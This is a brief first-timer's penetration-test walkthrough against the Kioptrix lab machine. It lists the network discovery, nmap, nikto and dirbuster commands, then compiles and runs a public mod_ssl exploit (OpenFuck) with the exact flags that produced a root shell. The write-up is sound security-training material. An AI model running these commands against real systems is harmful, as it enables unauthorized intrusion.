This is the first Pentest I am doing. The steps followed and some results will be shown.

$yourip = Your IP Address (Found using ifconfig) 

$ip = Kioptrix's machine

....
Run the command below to find the Kioptrix IP Address:

netdiscover -r $yourip/24 
....

....
To find available ports:

nmap -T4 -p- $ip
.....

Results:

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
443/tcp  open  https
1024/tcp open  kdm


....
A more advanced scan using the available ports

nmap -A -T4 -p22,80,111,139,443,1024 $ip
....


....
Find any vulnerabilities on the http page:

nikto -h $ip
....

....
Ran dirbuster to list hidden directories by brute force:

dirbuster
....

....
Took the "mod_ssl/2.8.4 appears to be outdated" from Nikto output and searched through exploit.db (https://www.exploit-db.com/exploits/47080)

Found the updated Github page (https://github.com/heltonWernik/OpenLuck)
and cloned the repo

Compiled the code through running gcc:
gcc OpenFuck.c -o OpenFuck -lcrypto
....

....
Ran the exploit:
./OpenFuck 0x6b $ip 443 -c 40 

0x6b is the code for the OS (Red Hat Linux)
-c is for the possible connection count range
....

....
Got access to the root command shell
